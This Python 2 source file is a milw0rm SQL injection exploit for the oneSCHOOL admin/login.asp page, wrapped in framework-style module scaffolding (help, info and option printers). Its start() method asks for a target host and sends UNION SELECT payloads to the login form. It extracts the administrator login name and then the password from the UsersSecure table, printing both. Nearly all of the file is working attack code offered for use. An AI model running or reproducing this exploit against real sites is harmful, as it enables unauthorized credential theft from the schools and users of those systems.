
def about():
	print '''oneSCHOOL admin/login.asp SQL Injection explot (for all versions)
by Guga360.
milw0rm.com [2007-12-31]
	'''

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (oneSchoolSQLi)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(8-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("oneSchoolSQLi","Basic","Description")
except:
	pass

def auto_info(name="",module="",plat="",priv="",lic="",rank="Normal",release="N/A",by="N/A"):
	print
	print "Publisher Information for oneSchoolSQLi"
	print
	print "	   Name:","oneSchoolSQLi"
	print "	 Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "	License:","None"
	print "	   Rank:",rank
	print "  Disclosed:","2007-12-31"
	print "   Author:","Guga360"

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class oneSchoolSQLi(object):
	def start(self):
		#!/usr/bin/python
		
		#oneSCHOOL admin/login.asp SQL Injection explot (for all versions)
		#by Guga360.
		
		import urllib
		from sys import argv
		
		query = {'txtOperation':'Login','txtLoginID':"""
		' union select min(LoginName),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from UsersSecure where LoginName>'a'--""",'txtPassword':'x','btnSubmit':'L+O+G+I+N+%3E%3E'}
		
		queryx = urllib.urlencode(query)
		
		print "*"*36
		print " "*11,"OneSchoolSQLi"
		print "*"*36
		
		if True:
			try:
				print '\n[+] Exploting...\n'
				host = raw_input("Host/URL: ")
				if host[0:7]<>'http://':
					host = 'http://'+host
				url = urllib.urlopen(host+'/admin/login.asp', queryx)
				url = url.read()
				url = url.split()
				name = url.index('varchar')+2
				name = url[name]
				name = name.replace("'","")
				print '[+] User: ' + name
				query2 = query.copy()
				query2['txtLoginID']="""' union select min(Password),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from UsersSecure where LoginName='"""+name+"""'--"""
				query2 = urllib.urlencode(query2)
				url = urllib.urlopen(host+'/admin/login.asp', query2)
				url = url.read()
				url = url.split()
				passw = url.index('varchar')+2
				passw = url[passw]
				passw = passw.replace("'","")
				print '[+] Pass: '+passw
			except:
				print '[+] Not vulnerable!'
		
		# milw0rm.com [2007-12-31]


def show_opt():
	print
	print "Module Options (oneSchoolSQLi)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	try:
		TIMEOUT
	except:
		TIMEOUT = 5
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "get-info":
		auto_info(module="exploit",plat="Python 2.7",priv="No",lic="N/A")
		show_opt()
		targets = {"1":"oneSCHOOL Website"}
		auto_targ(targets)
		about()
		print
except Exception as e:
	pass

try:
	if desc == "proc":
		try:
			program = oneSchoolSQLi()
			program.start()
		except Exception as e:
			print e
			print "[-] Failed"
			time.sleep(0.3)
			show_opt()
except:
	pass
